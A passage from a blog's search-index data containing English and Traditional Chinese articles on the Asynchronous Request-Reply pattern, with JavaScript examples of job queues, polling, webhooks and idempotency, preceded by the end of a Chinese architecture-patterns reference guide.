預先計算複雜查詢 絞殺者無花果模式（六月）- 逐步遷移舊系統 側車模式（七月）- 透過輔助元件新增功能 分片模式（八月）- 分散資料以提高可擴展性 閘道聚合模式（九月）- 合併多個 API 呼叫 發布-訂閱模式（十月）- 事件驅動通訊 健康端點監控模式（十一月）- 主動健康檢查 聯合身份模式（十二月）- 集中化身份驗證 斷路器模式（一月）- 防止連鎖故障 艙壁模式（三月）- 隔離資源以控制故障 非同步請求-回覆模式（四月）- 處理長時間執行的操作 其他資源 書籍 “Cloud Design Patterns” by Microsoft - 全面的模式目錄 “Release It!” by Michael Nygard - 生產就緒軟體模式 “Building Microservices” by Sam Newman - 微服務架構模式 “Domain-Driven Design” by Eric Evans - 策略設計模式 線上資源 Microsoft Azure 架構模式 AWS 架構中心 Martin Fowler 的架構模式 實踐 💡 從實作中學習學習模式的最佳方式是透過實作練習： 建構實作每個模式的範例應用程式 為使用這些模式的開源專案做出貢獻 與您的團隊進行架構審查 透過部落格文章和簡報分享知識 結論 架構模式是解決常見分散式系統挑戰的強大工具。本快速參考指南幫助您： 快速識別適合您問題的正確模式 比較模式跨多個維度 理解關係模式之間的關係 避免常見陷阱在模式應用中 規劃您的學習透過模式目錄的旅程 記住：模式是指南，不是僵化的規則。根據您的特定情境調整它們，測量它們的影響，並根據結果進行迭代。從簡單的模式如重試和健康端點監控開始，然後隨著系統的發展逐步採用更複雜的模式。 commentBox('5765834504929280-proj')","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Design Patterns","slug":"Design-Patterns","permalink":"https://neo01.com/tags/Design-Patterns/"},{"name":"Best Practices","slug":"Best-Practices","permalink":"https://neo01.com/tags/Best-Practices/"},{"name":"Reference Guide","slug":"Reference-Guide","permalink":"https://neo01.com/tags/Reference-Guide/"}],"lang":"zh-TW"},{"title":"The Asynchronous Request-Reply Pattern: Building Responsive Distributed Systems","slug":"2020/04/Asynchronous-Request-Reply-Pattern","date":"un11fin11","updated":"un55fin55","comments":true,"path":"2020/04/Asynchronous-Request-Reply-Pattern/","permalink":"https://neo01.com/2020/04/Asynchronous-Request-Reply-Pattern/","excerpt":"Discover how the Asynchronous Request-Reply pattern enables responsive applications by decoupling long-running operations from immediate responses, preventing timeouts and improving user experience.","text":"Modern applications often need to perform operations that take significant time to complete—processing large files, generating complex reports, or calling slow external APIs. When these operations block the request thread, they create poor user experiences and can exhaust server resources. The Asynchronous Request-Reply pattern solves this by decoupling the request from the response, allowing applications to remain responsive while work happens in the background. The Problem: When Operations Take Too Long Traditional synchronous request-response models work well for fast operations. A client sends a request, waits for processing, and receives a response—all within seconds. However, this model breaks down when operations take longer: Timeout Failures: HTTP connections timeout before processing completes Resource Exhaustion: Threads remain blocked, limiting concurrent requests Poor User Experience: Users stare at loading spinners or frozen interfaces Cascading Failures: Slow operations can bring down entire systems ⚠️ The Synchronous TrapA single slow operation that takes 30 seconds can tie up a thread for that entire duration. With limited threads available, just a few slow requests can make your entire application unresponsive to new requests. Consider these common scenarios: Video Processing: Converting uploaded videos to multiple formats Report Generation: Creating complex analytics reports from large datasets Batch Operations: Processing thousands of records in a single request External API Calls: Waiting for slow third-party services Machine Learning: Running inference on large models The Solution: Decouple Request from Response The Asynchronous Request-Reply pattern separates the request submission from result retrieval: Client submits request and immediately receives an acknowledgment with a status endpoint Server processes asynchronously in the background Client polls status endpoint or receives a callback when complete Client retrieves results when processing finishes sequenceDiagram participant Client participant API as API Gateway participant Queue as Message Queue participant Worker as Background Worker participant Storage as Result Storage Client->>API: 1. POST /process (request) API->>Queue: 2. Enqueue task API-->>Client: 3. 202 Accepted + status URL Note over Client: Client is free to do other work Worker->>Queue: 4. Dequeue task Worker->>Worker: 5. Process (long operation) Worker->>Storage: 6. Store result Client->>API: 7. GET /status/{id} API->>Storage: 8. Check status Storage-->>API: 9. Status: Complete API-->>Client: 10. 200 OK + result URL Client->>API: 11. GET /result/{id} API->>Storage: 12. Retrieve result Storage-->>API: 13. Return result API-->>Client: 14. 200 OK + result data How It Works: The Pattern in Action Let’s walk through implementing this pattern for a video transcoding service: Step 1: Submit the Request The client initiates processing and receives immediate acknowledgment: &#x2F;&#x2F; Client submits video for processing const response &#x3D; await fetch(&#39;&#x2F;api&#x2F;videos&#x2F;transcode&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(&#123; videoUrl: &#39;https:&#x2F;&#x2F;example.com&#x2F;video.mp4&#39;, formats: [&#39;720p&#39;, &#39;1080p&#39;, &#39;4k&#39;] &#125;) &#125;); &#x2F;&#x2F; Server responds immediately with 202 Accepted &#x2F;&#x2F; &#123; &#x2F;&#x2F; &quot;jobId&quot;: &quot;job-12345&quot;, &#x2F;&#x2F; &quot;status&quot;: &quot;pending&quot;, &#x2F;&#x2F; &quot;statusUrl&quot;: &quot;&#x2F;api&#x2F;videos&#x2F;status&#x2F;job-12345&quot; &#x2F;&#x2F; &#125; const &#123; jobId, statusUrl &#125; &#x3D; await response.json(); Step 2: Process Asynchronously The server queues the work and processes it in the background: &#x2F;&#x2F; API endpoint handler app.post(&#39;&#x2F;api&#x2F;videos&#x2F;transcode&#39;, async (req, res) &#x3D;&gt; &#123; const jobId &#x3D; generateJobId(); &#x2F;&#x2F; Store job metadata await jobStore.create(&#123; id: jobId, status: &#39;pending&#39;, request: req.body, createdAt: Date.now() &#125;); &#x2F;&#x2F; Queue for background processing await messageQueue.send(&#123; jobId, videoUrl: req.body.videoUrl, formats: req.body.formats &#125;); &#x2F;&#x2F; Respond immediately res.status(202).json(&#123; jobId, status: &#39;pending&#39;, statusUrl: &#96;&#x2F;api&#x2F;videos&#x2F;status&#x2F;$&#123;jobId&#125;&#96; &#125;); &#125;); &#x2F;&#x2F; Background worker messageQueue.subscribe(async (message) &#x3D;&gt; &#123; await jobStore.update(message.jobId, &#123; status: &#39;processing&#39; &#125;); try &#123; const results &#x3D; await transcodeVideo( message.videoUrl, message.formats ); await jobStore.update(message.jobId, &#123; status: &#39;completed&#39;, results, completedAt: Date.now() &#125;); &#125; catch (error) &#123; await jobStore.update(message.jobId, &#123; status: &#39;failed&#39;, error: error.message &#125;); &#125; &#125;); Step 3: Check Status The client polls the status endpoint to track progress: &#x2F;&#x2F; Client polls for completion async function waitForCompletion(statusUrl) &#123; while (true) &#123; const response &#x3D; await fetch(statusUrl); const status &#x3D; await response.json(); if (status.status &#x3D;&#x3D;&#x3D; &#39;completed&#39;) &#123; return status.results; &#125; if (status.status &#x3D;&#x3D;&#x3D; &#39;failed&#39;) &#123; throw new Error(status.error); &#125; &#x2F;&#x2F; Wait before polling again await sleep(2000); &#125; &#125; &#x2F;&#x2F; Status endpoint app.get(&#39;&#x2F;api&#x2F;videos&#x2F;status&#x2F;:jobId&#39;, async (req, res) &#x3D;&gt; &#123; const job &#x3D; await jobStore.get(req.params.jobId); if (!job) &#123; return res.status(404).json(&#123; error: &#39;Job not found&#39; &#125;); &#125; res.json(&#123; jobId: job.id, status: job.status, results: job.results, createdAt: job.createdAt, completedAt: job.completedAt &#125;); &#125;); Implementation Strategies Strategy 1: Polling The client periodically checks the status endpoint: Advantages: Simple to implement Works with any HTTP client No server-side callback infrastructure needed Disadvantages: Increased network traffic Delayed notification (polling interval) Wasted requests when nothing changes &#x2F;&#x2F; Exponential backoff polling async function pollWithBackoff(statusUrl, maxAttempts &#x3D; 30) &#123; let delay &#x3D; 1000; &#x2F;&#x2F; Start with 1 second for (let i &#x3D; 0; i &lt; maxAttempts; i++) &#123; const status &#x3D; await checkStatus(statusUrl); if (status.status !&#x3D;&#x3D; &#39;pending&#39; &amp;&amp; status.status !&#x3D;&#x3D; &#39;processing&#39;) &#123; return status; &#125; await sleep(delay); delay &#x3D; Math.min(delay * 1.5, 30000); &#x2F;&#x2F; Max 30 seconds &#125; throw new Error(&#39;Polling timeout&#39;); &#125; Strategy 2: Webhooks The server calls back to the client when processing completes: Advantages: Immediate notification No wasted polling requests Efficient use of resources Disadvantages: Requires publicly accessible callback URL More complex error handling Security considerations (authentication, validation) &#x2F;&#x2F; Client provides callback URL await fetch(&#39;&#x2F;api&#x2F;videos&#x2F;transcode&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(&#123; videoUrl: &#39;https:&#x2F;&#x2F;example.com&#x2F;video.mp4&#39;, formats: [&#39;720p&#39;, &#39;1080p&#39;], callbackUrl: &#39;https:&#x2F;&#x2F;client.com&#x2F;webhook&#x2F;video-complete&#39; &#125;) &#125;); &#x2F;&#x2F; Server calls webhook when complete async function notifyCompletion(job) &#123; if (job.callbackUrl) &#123; await fetch(job.callbackUrl, &#123; method: &#39;POST&#39;, headers: &#123; &#39;X-Signature&#39;: generateSignature(job), &#39;Content-Type&#39;: &#39;application&#x2F;json&#39; &#125;, body: JSON.stringify(&#123; jobId: job.id, status: job.status, results: job.results &#125;) &#125;); &#125; &#125; Strategy 3: WebSockets Maintain a persistent connection for real-time updates: Advantages: Real-time bidirectional communication Efficient for multiple updates Great for progress tracking Disadvantages: More complex infrastructure Connection management overhead Not suitable for all environments &#x2F;&#x2F; Client establishes WebSocket connection const ws &#x3D; new WebSocket(&#96;wss:&#x2F;&#x2F;api.example.com&#x2F;jobs&#x2F;$&#123;jobId&#125;&#96;); ws.onmessage &#x3D; (event) &#x3D;&gt; &#123; const update &#x3D; JSON.parse(event.data); if (update.status &#x3D;&#x3D;&#x3D; &#39;processing&#39;) &#123; console.log(&#96;Progress: $&#123;update.progress&#125;%&#96;); &#125; else if (update.status &#x3D;&#x3D;&#x3D; &#39;completed&#39;) &#123; console.log(&#39;Job completed:&#39;, update.results); ws.close(); &#125; &#125;; Key Implementation Considerations 1. Status Endpoint Design Design clear, informative status responses: &#x2F;&#x2F; Well-designed status response &#123; &quot;jobId&quot;: &quot;job-12345&quot;, &quot;status&quot;: &quot;processing&quot;, &quot;progress&quot;: 65, &quot;message&quot;: &quot;Transcoding to 1080p format&quot;, &quot;createdAt&quot;: &quot;2020-04-15T10:30:00Z&quot;, &quot;estimatedCompletion&quot;: &quot;2020-04-15T10:35:00Z&quot;, &quot;_links&quot;: &#123; &quot;self&quot;: &quot;&#x2F;api&#x2F;videos&#x2F;status&#x2F;job-12345&quot;, &quot;cancel&quot;: &quot;&#x2F;api&#x2F;videos&#x2F;cancel&#x2F;job-12345&quot; &#125; &#125; 2. HTTP Status Codes Use appropriate status codes to communicate state: 202 Accepted: Request accepted for processing 200 OK: Status check successful 303 See Other: Processing complete, redirect to result 404 Not Found: Job ID doesn’t exist 410 Gone: Job expired or cleaned up 3. Result Storage and Expiration Implement lifecycle management for results: &#x2F;&#x2F; Store results with TTL await resultStore.set(jobId, result, &#123; expiresIn: 24 * 60 * 60 &#x2F;&#x2F; 24 hours &#125;); &#x2F;&#x2F; Clean up expired jobs setInterval(async () &#x3D;&gt; &#123; const expiredJobs &#x3D; await jobStore.findExpired(); for (const job of expiredJobs) &#123; await resultStore.delete(job.id); await jobStore.delete(job.id); &#125; &#125;, 60 * 60 * 1000); &#x2F;&#x2F; Every hour 4. Idempotency Ensure requests can be safely retried: &#x2F;&#x2F; Use idempotency keys app.post(&#39;&#x2F;api&#x2F;videos&#x2F;transcode&#39;, async (req, res) &#x3D;&gt; &#123; const idempotencyKey &#x3D; req.headers[&#39;idempotency-key&#39;]; &#x2F;&#x2F; Check if already processed const existing &#x3D; await jobStore.findByIdempotencyKey(idempotencyKey); if (existing) &#123; return res.status(202).json(&#123; jobId: existing.id, status: existing.status, statusUrl: &#96;&#x2F;api&#x2F;videos&#x2F;status&#x2F;$&#123;existing.id&#125;&#96; &#125;); &#125; &#x2F;&#x2F; Process new request const jobId &#x3D; await createJob(req.body, idempotencyKey); &#x2F;&#x2F; ... &#125;); When to Use This Pattern Ideal Scenarios ✅ Perfect Use CasesLong-Running Operations: Tasks that take more than a few seconds to complete Resource-Intensive Processing: Operations that consume significant CPU, memory, or I/O External Dependencies: Calls to slow or unreliable third-party services Batch Processing: Operations on large datasets or multiple items Consider Alternatives When 🤔 Think Twice If...Fast Operations: Sub-second operations don't benefit from async complexity Simple Use Cases: Straightforward CRUD operations work fine synchronously Real-Time Requirements: When immediate results are absolutely required Architecture Quality Attributes Scalability The pattern enables horizontal scaling: Worker Scaling: Add more background workers to handle increased load Queue Buffering: Message queues absorb traffic spikes Resource Optimization: Separate API and processing tiers scale independently Resilience Enhanced fault tolerance through: Retry Logic: Failed jobs can be automatically retried Circuit Breaking: Protect against cascading failures Graceful Degradation: API remains responsive even when workers are overloaded User Experience Improved responsiveness: Immediate Feedback: Users get instant acknowledgment Progress Updates: Show processing status and estimated completion Non-Blocking: Users can continue other activities while waiting Common Pitfalls and Solutions ⚠️ Watch Out ForPolling Storms: Too many clients polling too frequently Solution: Implement exponential backoff and rate limiting ⚠️ Watch Out ForLost Results: Results expire before client retrieves them Solution: Set appropriate TTLs and notify clients before expiration ⚠️ Watch Out ForOrphaned Jobs: Jobs stuck in processing state forever Solution: Implement job timeouts and dead letter queues Real-World Example: Document Processing Service Here’s a complete example of a document processing service: &#x2F;&#x2F; API Layer class DocumentProcessingAPI &#123; async submitDocument(file, options) &#123; const jobId &#x3D; uuidv4(); &#x2F;&#x2F; Upload file to storage const fileUrl &#x3D; await storage.upload(file); &#x2F;&#x2F; Create job record await db.jobs.create(&#123; id: jobId, status: &#39;pending&#39;, fileUrl, options, createdAt: new Date() &#125;); &#x2F;&#x2F; Queue for processing await queue.publish(&#39;document-processing&#39;, &#123; jobId, fileUrl, options &#125;); return &#123; jobId, statusUrl: &#96;&#x2F;api&#x2F;documents&#x2F;status&#x2F;$&#123;jobId&#125;&#96; &#125;; &#125; async getStatus(jobId) &#123; const job &#x3D; await db.jobs.findById(jobId); if (!job) &#123; throw new NotFoundError(&#39;Job not found&#39;); &#125; return &#123; jobId: job.id, status: job.status, progress: job.progress, result: job.result, error: job.error &#125;; &#125; &#125; &#x2F;&#x2F; Worker Layer class DocumentProcessor &#123; async processJob(message) &#123; const &#123; jobId, fileUrl, options &#125; &#x3D; message; try &#123; await this.updateStatus(jobId, &#39;processing&#39;, 0); &#x2F;&#x2F; Download document const document &#x3D; await storage.download(fileUrl); await this.updateStatus(jobId, &#39;processing&#39;, 25); &#x2F;&#x2F; Extract text const text &#x3D; await this.extractText(document); await this.updateStatus(jobId, &#39;processing&#39;, 50); &#x2F;&#x2F; Analyze content const analysis &#x3D; await this.analyzeContent(text, options); await this.updateStatus(jobId, &#39;processing&#39;, 75); &#x2F;&#x2F; Generate report const report &#x3D; await this.generateReport(analysis); await this.updateStatus(jobId, &#39;processing&#39;, 90); &#x2F;&#x2F; Store result const resultUrl &#x3D; await storage.upload(report); await this.updateStatus(jobId, &#39;completed&#39;, 100, &#123; resultUrl &#125;); &#125; catch (error) &#123; await this.updateStatus(jobId, &#39;failed&#39;, null, null, error.message); throw error; &#125; &#125; async updateStatus(jobId, status, progress, result &#x3D; null, error &#x3D; null) &#123; await db.jobs.update(jobId, &#123; status, progress, result, error, updatedAt: new Date() &#125;); &#125; &#125; Conclusion The Asynchronous Request-Reply pattern is essential for building responsive, scalable distributed systems. By decoupling long-running operations from immediate responses, it enables: Better User Experience: Immediate feedback and non-blocking operations Improved Scalability: Independent scaling of API and processing layers Enhanced Resilience: Graceful handling of failures and retries Resource Efficiency: Optimal use of threads and connections While it introduces complexity through status tracking and result management, the benefits far outweigh the costs for operations that take more than a few seconds. Consider this pattern whenever you need to perform time-consuming work without blocking the client. Related Patterns Claim-Check Pattern: Complements async processing for handling large payloads Queue-Based Load Leveling: Smooths out traffic spikes with message queues Competing Consumers: Enables parallel processing of queued jobs Priority Queue: Processes high-priority jobs before others References Microsoft Azure Architecture Patterns: Asynchronous Request-Reply Enterprise Integration Patterns: Request-Reply","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Design Patterns","slug":"Design-Patterns","permalink":"https://neo01.com/tags/Design-Patterns/"},{"name":"Messaging","slug":"Messaging","permalink":"https://neo01.com/tags/Messaging/"},{"name":"Asynchronous Processing","slug":"Asynchronous-Processing","permalink":"https://neo01.com/tags/Asynchronous-Processing/"}]},{"title":"非同步請求-回覆模式：建構響應式分散式系統","slug":"2020/04/Asynchronous-Request-Reply-Pattern-zh-TW","date":"un11fin11","updated":"un55fin55","comments":true,"path":"/zh-TW/2020/04/Asynchronous-Request-Reply-Pattern/","permalink":"https://neo01.com/zh-TW/2020/04/Asynchronous-Request-Reply-Pattern/","excerpt":"了解非同步請求-回覆模式如何透過將長時間執行的操作與即時回應解耦，實現響應式應用程式，防止逾時並改善使用者體驗。","text":"現代應用程式經常需要執行需要大量時間完成的操作——處理大型檔案、產生複雜報表，或呼叫緩慢的外部 API。當這些操作阻塞請求執行緒時，會造成糟糕的使用者體驗，並可能耗盡伺服器資源。非同步請求-回覆模式透過將請求與回應解耦來解決這個問題，讓應用程式在背景處理工作時保持響應。 問題：當操作耗時過長 傳統的同步請求-回應模型適用於快速操作。客戶端發送請求，等待處理，然後接收回應——全部在幾秒內完成。然而，當操作耗時較長時，這個模型就會失效： 逾時失敗：HTTP 連線在處理完成前逾時 資源耗盡：執行緒保持阻塞狀態，限制並行請求數量 糟糕的使用者體驗：使用者盯著載入動畫或凍結的介面 連鎖故障：緩慢的操作可能導致整個系統當機 ⚠️ 同步陷阱單一耗時 30 秒的緩慢操作可能在整個期間佔用一個執行緒。在執行緒數量有限的情況下，僅僅幾個緩慢的請求就能讓整個應用程式對新請求無回應。 考慮這些常見場景： 影片處理：將上傳的影片轉換為多種格式 報表產生：從大型資料集建立複雜的分析報表 批次操作：在單一請求中處理數千筆記錄 外部 API 呼叫：等待緩慢的第三方服務 機器學習：在大型模型上執行推論 解決方案：將請求與回應解耦 非同步請求-回覆模式將請求提交與結果擷取分離： 客戶端提交請求並立即收到確認訊息及狀態端點 伺服器在背景非同步處理 客戶端輪詢狀態端點或在完成時接收回呼 客戶端在處理完成時擷取結果 sequenceDiagram participant Client as 客戶端 participant API as API 閘道 participant Queue as 訊息佇列 participant Worker as 背景工作程序 participant Storage as 結果儲存 Client->>API: 1. POST /process (請求) API->>Queue: 2. 將任務加入佇列 API-->>Client: 3. 202 Accepted + 狀態 URL Note over Client: 客戶端可自由執行其他工作 Worker->>Queue: 4. 從佇列取出任務 Worker->>Worker: 5. 處理（長時間操作） Worker->>Storage: 6. 儲存結果 Client->>API: 7. GET /status/{id} API->>Storage: 8. 檢查狀態 Storage-->>API: 9. 狀態：完成 API-->>Client: 10. 200 OK + 結果 URL Client->>API: 11. GET /result/{id} API->>Storage: 12. 擷取結果 Storage-->>API: 13. 回傳結果 API-->>Client: 14. 200 OK + 結果資料 運作方式：模式實戰 讓我們逐步了解如何為影片轉碼服務實作此模式： 步驟 1：提交請求 客戶端啟動處理並立即收到確認： &#x2F;&#x2F; 客戶端提交影片進行處理 const response &#x3D; await fetch(&#39;&#x2F;api&#x2F;videos&#x2F;transcode&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(&#123; videoUrl: &#39;https:&#x2F;&#x2F;example.com&#x2F;video.mp4&#39;, formats: [&#39;720p&#39;, &#39;1080p&#39;, &#39;4k&#39;] &#125;) &#125;); &#x2F;&#x2F; 伺服器立即回應 202 Accepted &#x2F;&#x2F; &#123; &#x2F;&#x2F; &quot;jobId&quot;: &quot;job-12345&quot;, &#x2F;&#x2F; &quot;status&quot;: &quot;pending&quot;, &#x2F;&#x2F; &quot;statusUrl&quot;: &quot;&#x2F;api&#x2F;videos&#x2F;status&#x2F;job-12345&quot; &#x2F;&#x2F; &#125; const &#123; jobId, statusUrl &#125; &#x3D; await response.json(); 步驟 2：非同步處理 伺服器將工作加入佇列並在背景處理： &#x2F;&#x2F; API 端點處理器 app.post(&#39;&#x2F;api&#x2F;videos&#x2F;transcode&#39;, async (req, res) &#x3D;&gt; &#123; const jobId &#x3D; generateJobId(); &#x2F;&#x2F; 儲存工作中繼資料 await jobStore.create(&#123; id: jobId, status: &#39;pending&#39;, request: req.body, createdAt: Date.now() &#125;); &#x2F;&#x2F; 加入佇列進行背景處理 await messageQueue.send(&#123; jobId, videoUrl: req.body.videoUrl, formats: req.body.formats &#125;); &#x2F;&#x2F; 立即回應 res.status(202).json(&#123; jobId, status: &#39;pending&#39;, statusUrl: &#96;&#x2F;api&#x2F;videos&#x2F;status&#x2F;$&#123;jobId&#125;&#96; &#125;); &#125;); &#x2F;&#x2F; 背景工作程序 messageQueue.subscribe(async (message) &#x3D;&gt; &#123; await jobStore.update(message.jobId, &#123; status: &#39;processing&#39; &#125;); try &#123; const results &#x3D; await transcodeVideo( message.videoUrl, message.formats ); await jobStore.update(message.jobId, &#123; status: &#39;completed&#39;, results, completedAt: Date.now() &#125;); &#125; catch (error) &#123; await jobStore.update(message.jobId, &#123; status: &#39;failed&#39;, error: error.message &#125;); &#125; &#125;); 步驟 3：檢查狀態 客戶端輪詢狀態端點以追蹤進度： &#x2F;&#x2F; 客戶端輪詢完成狀態 async function waitForCompletion(statusUrl) &#123; while (true) &#123; const response &#x3D; await fetch(statusUrl); const status &#x3D; await response.json(); if (status.status &#x3D;&#x3D;&#x3D; &#39;completed&#39;) &#123; return status.results; &#125; if (status.status &#x3D;&#x3D;&#x3D; &#39;failed&#39;) &#123; throw new Error(status.error); &#125; &#x2F;&#x2F; 再次輪詢前等待 await sleep(2000); &#125; &#125; &#x2F;&#x2F; 狀態端點 app.get(&#39;&#x2F;api&#x2F;videos&#x2F;status&#x2F;:jobId&#39;, async (req, res) &#x3D;&gt; &#123; const job &#x3D; await jobStore.get(req.params.jobId); if (!job) &#123; return res.status(404).json(&#123; error: &#39;Job not found&#39; &#125;); &#125; res.json(&#123; jobId: job.id, status: job.status, results: job.results, createdAt: job.createdAt, completedAt: job.completedAt &#125;); &#125;); 實作策略 策略 1：輪詢 客戶端定期檢查狀態端點： 優點： 實作簡單 適用於任何 HTTP 客戶端 不需要伺服器端回呼基礎設施 缺點： 增加網路流量 延遲通知（輪詢間隔） 當沒有變化時浪費請求 &#x2F;&#x2F; 指數退避輪詢 async function pollWithBackoff(statusUrl, maxAttempts &#x3D; 30) &#123; let delay &#x3D; 1000; &#x2F;&#x2F; 從 1 秒開始 for (let i &#x3D; 0; i &lt; maxAttempts; i++) &#123; const status &#x3D; await checkStatus(statusUrl); if (status.status !&#x3D;&#x3D; &#39;pending&#39; &amp;&amp; status.status !&#x3D;&#x3D; &#39;processing&#39;) &#123; return status; &#125; await sleep(delay); delay &#x3D; Math.min(delay * 1.5, 30000); &#x2F;&#x2F; 最多 30 秒 &#125; throw new Error(&#39;Polling timeout&#39;); &#125; 策略 2：Webhooks 伺服器在處理完成時回呼客戶端： 優點： 立即通知 不浪費輪詢請求 有效利用資源 缺點： 需要可公開存取的回呼 URL 更複雜的錯誤處理 安全性考量（驗證、確認） &#x2F;&#x2F; 客戶端提供回呼 URL await fetch(&#39;&#x2F;api&#x2F;videos&#x2F;transcode&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(&#123; videoUrl: &#39;https:&#x2F;&#x2F;example.com&#x2F;video.mp4&#39;, formats: [&#39;720p&#39;, &#39;1080p&#39;], callbackUrl: &#39;https:&#x2F;&#x2F;client.com&#x2F;webhook&#x2F;video-complete&#39; &#125;) &#125;); &#x2F;&#x2F; 伺服器在完成時呼叫 webhook async function notifyCompletion(job) &#123; if (job.callbackUrl) &#123; await fetch(job.callbackUrl, &#123; method: &#39;POST&#39;, headers: &#123; &#39;X-Signature&#39;: generateSignature(job), &#39;Content-Type&#39;: &#39;application&#x2F;json&#39; &#125;, body: JSON.stringify(&#123; jobId: job.id, status: job.status, results: job.results &#125;) &#125;); &#125; &#125; 策略 3：WebSockets 維護持久連線以進行即時更新： 優點： 即時雙向通訊 對多次更新有效率 適合進度追蹤 缺點： 更複雜的基礎設施 連線管理開銷 不適用於所有環境 &#x2F;&#x2F; 客戶端建立 WebSocket 連線 const ws &#x3D; new WebSocket(&#96;wss:&#x2F;&#x2F;api.example.com&#x2F;jobs&#x2F;$&#123;jobId&#125;&#96;); ws.onmessage &#x3D; (event) &#x3D;&gt; &#123; const update &#x3D; JSON.parse(event.data); if (update.status &#x3D;&#x3D;&#x3D; &#39;processing&#39;) &#123; console.log(&#96;進度：$&#123;update.progress&#125;%&#96;); &#125; else if (update.status &#x3D;&#x3D;&#x3D; &#39;completed&#39;) &#123; console.log(&#39;工作完成：&#39;, update.results); ws.close(); &#125; &#125;; 關鍵實作考量 1. 狀態端點設計 設計清晰、資訊豐富的狀態回應： &#x2F;&#x2F; 設計良好的狀態回應 &#123; &quot;jobId&quot;: &quot;job-12345&quot;, &quot;status&quot;: &quot;processing&quot;, &quot;progress&quot;: 65, &quot;message&quot;: &quot;正在轉碼為 1080p 格式&quot;, &quot;createdAt&quot;: &quot;2020-04-15T10:30:00Z&quot;, &quot;estimatedCompletion&quot;: &quot;2020-04-15T10:35:00Z&quot;, &quot;_links&quot;: &#123; &quot;self&quot;: &quot;&#x2F;api&#x2F;videos&#x2F;status&#x2F;job-12345&quot;, &quot;cancel&quot;: &quot;&#x2F;api&#x2F;videos&#x2F;cancel&#x2F;job-12345&quot; &#125; &#125; 2. HTTP 狀態碼 使用適當的狀態碼來傳達狀態： 202 Accepted：請求已接受處理 200 OK：狀態檢查成功 303 See Other：處理完成，重新導向至結果 404 Not Found：工作 ID 不存在 410 Gone：工作已過期或清理 3. 結果儲存與過期 實作結果的生命週期管理： &#x2F;&#x2F; 儲存具有 TTL 的結果 await resultStore.set(jobId, result, &#123; expiresIn: 24 * 60 * 60 &#x2F;&#x2F; 24 小時 &#125;); &#x2F;&#x2F; 清理過期的工作 setInterval(async () &#x3D;&gt; &#123; const expiredJobs &#x3D; await jobStore.findExpired(); for (const job of expiredJobs) &#123; await resultStore.delete(job.id); await jobStore.delete(job.id); &#125; &#125;, 60 * 60 * 1000); &#x2F;&#x2F; 每小時 4. 冪等性 確保請求可以安全地重試： &#x2F;&#x2F; 使用冪等性金鑰 app.post(&#39;&#x2F;api&#x2F;videos&#x2F;transcode&#39;, async (req, res) &#x3D;&gt; &#123; const idempotencyKey &#x3D; req.headers[&#39;idempotency-key&#39;]; &#x2F;&#x2F; 檢查是否已處理 const existing &#x3D; await jobStore.findByIdempotencyKey(idempotencyKey); if (existing) &#123; return res.status(202).json(&#123; jobId: existing.id, status: existing.status, statusUrl: &#96;&#x2F;api&#x2F;videos&#x2F;status&#x2F;$&#123;existing.id&#125;&#96; &#125;); &#125; &#x2F;&#x2F; 處理新請求 const jobId &#x3D; await createJob(req.body, idempotencyKey); &#x2F;&#x2F; ... &#125;); 何時使用此模式 理想場景 ✅ 完美使用案例長時間執行的操作：需要超過幾秒才能完成的任務 資源密集型處理：消耗大量 CPU、記憶體或 I/O 的操作 外部相依性：呼叫緩慢或不可靠的第三方服務 批次處理：對大型資料集或多個項目的操作 考慮替代方案的情況 🤔 請三思如果...快速操作：次秒級操作不會從非同步複雜性中受益 簡單使用案例：直接的 CRUD 操作同步運作良好 即時需求：當絕對需要立即結果時 架構品質屬性 可擴展性 此模式實現水平擴展： 工作程序擴展：新增更多背景工作程序以處理增加的負載 佇列緩衝：訊息佇列吸收流量高峰 資源最佳化：API 和處理層獨立擴展 韌性 透過以下方式增強容錯能力： 重試邏輯：失敗的工作可以自動重試 斷路器：防止連鎖故障 優雅降級：即使工作程序過載，API 仍保持響應 使用者體驗 改善響應性： 即時回饋：使用者獲得即時確認 進度更新：顯示處理狀態和預估完成時間 非阻塞：使用者可以在等待時繼續其他活動 常見陷阱與解決方案 ⚠️ 注意輪詢風暴：太多客戶端過於頻繁地輪詢 解決方案：實作指數退避和速率限制 ⚠️ 注意遺失結果：結果在客戶端擷取前過期 解決方案：設定適當的 TTL 並在過期前通知客戶端 ⚠️ 注意孤立工作：工作永遠卡在處理狀態 解決方案：實作工作逾時和死信佇列 實際範例：文件處理服務 這是一個完整的文件處理服務範例： &#x2F;&#x2F; API 層 class DocumentProcessingAPI &#123; async submitDocument(file, options) &#123; const jobId &#x3D; uuidv4(); &#x2F;&#x2F; 上傳檔案至儲存 const fileUrl &#x3D; await storage.upload(file); &#x2F;&#x2F; 建立工作記錄 await db.jobs.create(&#123; id: jobId, status: &#39;pending&#39;, fileUrl, options, createdAt: new Date() &#125;); &#x2F;&#x2F; 加入佇列進行處理 await queue.publish(&#39;document-processing&#39;, &#123; jobId, fileUrl, options &#125;); return &#123; jobId, statusUrl: &#96;&#x2F;api&#x2F;documents&#x2F;status&#x2F;$&#123;jobId&#125;&#96; &#125;; &#125; async getStatus(jobId) &#123; const job &#x3D; await db.jobs.findById(jobId); if (!job) &#123; throw new NotFoundError(&#39;Job not found&#39;); &#125; return &#123; jobId: job.id, status: job.status, progress: job.progress, result: job.result, error: job.error &#125;; &#125; &#125; &#x2F;&#x2F; 工作程序層 class DocumentProcessor &#123; async processJob(message) &#123; const &#123; jobId, fileUrl, options &#125; &#x3D; message; try &#123; await this.updateStatus(jobId, &#39;processing&#39;, 0); &#x2F;&#x2F; 下載文件 const document &#x3D; await storage.download(fileUrl); await this.updateStatus(jobId, &#39;processing&#39;, 25); &#x2F;&#x2F; 提取文字 const text &#x3D; await this.extractText(document); await this.updateStatus(jobId, &#39;processing&#39;, 50); &#x2F;&#x2F; 分析內容 const analysis &#x3D; await this.analyzeContent(text, options); await this.updateStatus(jobId, &#39;processing&#39;, 75); &#x2F;&#x2F; 產生報表 const report &#x3D; await this.generateReport(analysis); await this.updateStatus(jobId, &#39;processing&#39;, 